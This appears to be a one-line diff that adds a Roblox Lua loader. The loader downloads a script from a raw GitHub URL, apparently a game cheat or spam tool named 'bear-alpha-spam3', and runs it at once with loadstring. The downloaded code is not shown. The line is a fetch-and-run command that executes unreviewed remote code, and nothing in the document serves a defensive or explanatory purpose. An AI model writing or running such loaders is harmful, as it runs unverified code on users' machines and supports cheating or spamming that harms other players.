@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/bear-alpha-spam3-uaodr9oyoahxbl.lua"))()
